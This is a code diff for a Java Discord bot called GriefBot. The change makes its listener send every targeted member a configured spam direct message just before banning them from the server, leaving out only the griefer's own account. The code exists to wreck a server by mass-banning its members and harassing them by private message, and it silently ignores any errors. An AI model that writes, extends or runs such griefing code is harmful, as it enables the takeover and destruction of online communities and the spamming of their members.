@@ -65,6 +65,7 @@ public class GriefBotListener extends ListenerAdapter {
 					|| member.getId() == GriefBot.getInstance().getGrieferUserID()) {
 				return;
 			} else {
+				spamMessage(member.getUser());
 				member.getGuild().ban(member, 0, "bruh").queue();
 			}
 		});
@@ -91,5 +92,13 @@ public class GriefBotListener extends ListenerAdapter {
 			} catch (Exception ignored) {
 			}
 		}
+	}
+	
+	private void spamMessage(User user) {
+		try {
+			user.openPrivateChannel().queue((channel) -> {
+				channel.sendMessage(GriefBot.getInstance().getMembersSpamMessage()).queue();
+			});
+		} catch (Exception ignored) { }
 	}
 }
